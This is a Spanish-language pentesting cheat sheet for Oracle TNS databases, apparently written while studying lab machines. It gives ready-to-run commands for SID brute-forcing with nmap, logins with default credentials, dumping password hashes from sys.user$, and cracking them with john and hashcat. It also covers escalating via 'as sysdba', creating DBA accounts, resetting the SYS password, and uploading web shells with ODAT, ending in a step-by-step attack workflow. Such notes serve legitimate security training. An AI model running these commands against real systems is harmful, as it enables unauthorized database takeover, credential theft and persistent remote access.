# üîé Oracle TNS ‚Äì Pentesting & Post-Explotaci√≥n

## üìå Introducci√≥n
- **Oracle Transparent Network Substrate (TNS)** es el protocolo de comunicaci√≥n entre bases de datos Oracle y aplicaciones.
- Puerto por defecto: **TCP/1521**.
- Archivos de configuraci√≥n:
  - `tnsnames.ora` ‚Üí resoluci√≥n de nombres de servicio (cliente).
  - `listener.ora` ‚Üí define listeners y par√°metros (servidor).
- Compatible con IPv6 y SSL/TLS.
- Usado en sectores cr√≠ticos (banca, salud, retail).

---

## ‚öôÔ∏è Configuraci√≥n por defecto
- Listener activo en **TCP/1521**.
- Gesti√≥n remota habilitada en **8i/9i**, no en 10g+.
- Seguridad b√°sica: autenticaci√≥n por host/IP/usuario/contrase√±a.
- Cuentas por defecto:
  - `CHANGE_ON_INSTALL` (Oracle 9).
  - `dbsnmp/dbsnmp` (DBSNMP service).

---

## üõ†Ô∏è Herramientas
- **ODAT (Oracle Database Attacking Tool)** ‚Üí exploits, enumeraci√≥n, subida de ficheros.
- **sqlplus** ‚Üí cliente oficial Oracle.
- **Nmap**:
  ```bash
  nmap -p1521 -sV <IP>
  nmap -p1521 --script oracle-sid-brute <IP>
  ```

---
## Instalaci√≥n de dependencias para sqlplus y ODAT
```bash
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

## üîë Usuarios y Hashes en `sys.user$`

- Tabla **`sys.user$`** almacena usuarios y contrase√±as encriptadas.
- Requiere privilegios altos (`SYSDBA`).
- Ejemplo:

  ```sql
  select name, password from sys.user$;
  ```

### üßë‚Äçüíª Usuario DBSNMP
- Usuario por defecto para **Oracle Enterprise Manager**.
- Contrase√±a por defecto: `dbsnmp`.
- Puede tener permisos elevados ‚Üí objetivo prioritario.

---

## üîì Crackeo de Hashes
### Pre-11g (DES)
```bash
john --format=oracle oracle_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### 11g+ (SHA-1 salted)
```bash
hashcat -m 112 oracle_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## ‚ö° Escalada con `as sysdba`
Probar conexi√≥n con privilegios:
```bash
sqlplus scott/tiger@10.10.10.10/XE as sysdba
```

Si funciona ‚Üí acceso como **SYS** con rol **DBA** completo:
```sql
create user test identified by test;
grant dba to pentester;

alter user sys identified by newpassword;
```

---

## üï∏Ô∏è Subida de Webshell con ODAT
Ejemplo Windows (IIS en `C:\inetpub\wwwroot`):
```shell-session
./odat.py utlfile -s 10.129.205.19 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Comando que funcion√≥:
```shell
./odat.py utlfile -s 10.129.205.19 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.aspx ./shell.aspx 
```

Ejemplo Linux (Apache en `/var/www/html`):
```bash
./odat.py utlfile -s 10.10.10.10 -d XE -U scott -P tiger --sysdba \
--putFile /var/www/html shell.php ./local_shell.php
```

Verificar:
```bash
curl http://10.10.10.10/shell.php
```

---

## üîç Buscar credenciales en aplicaciones
1. Listar usuarios y roles:
   ```sql
   select * from dba_users;
   select * from dba_role_privs;
   ```

2. Buscar tablas con usuarios:
   ```sql
   select table_name from all_tables where table_name like '%USER%';
   select * from APP_USERS;
   select * from USERS;
   ```

3. Revisar archivos de configuraci√≥n v√≠a **UTL_FILE/ODAT**:
   - Java: `config.xml`, `application.properties`.
   - PHP: `config.php`, `.env`.

---

## üìå Workflow de ataque recomendado
1. **Enumerar** con Nmap + ODAT.  
2. **Encontrar credenciales v√°lidas** (`scott/tiger`, `dbsnmp/dbsnmp`).  
3. **Conectar con sqlplus** y probar **`as sysdba`**.  
4. **Extraer hashes** de `sys.user$` ‚Üí crackear con John/Hashcat.  
5. Si escalas a SYS/DBA ‚Üí crear usuario propio o alterar SYS.  
6. Intentar **escribir en directorios web** para subir shell.  
7. **Revisar tablas de apps** ‚Üí credenciales reutilizables.  

---

## üìã Chuletario r√°pido

### Escaneo
```bash
nmap --open -p1521 -sVC <IP>
nmap -p1521 --script oracle-sid-brute <IP>
```

Ejemplo: 
Tras usar el script de nmap `oracle-sid-brute` obtenemos: XE es el SID de la instancia de oracle
```nmap
1521/tcp open  oracle  syn-ack ttl 127
| oracle-sid-brute: 
|_  XE
```
### Enumeraci√≥n con ODAT
```bash
./odat.py all -s <IP>
```

### Conexi√≥n
```bash
sqlplus usuario/pass@<IP>/<SID>
sqlplus usuario/pass@<IP>/<SID> as sysdba
```

### Hashes
```sql
select name, password from sys.user$;
```

### Crackeo
```bash
john --format=oracle hashes.txt --wordlist=rockyou.txt
hashcat -m 112 hashes.txt rockyou.txt
```

### Subida de shell
```bash
./odat.py utlfile -s <IP> -d <SID> -U user -P pass --sysdba \
--putFile /var/www/html shell.php ./shell.php
```
```bash
curl http://<IP>/shell.php
```


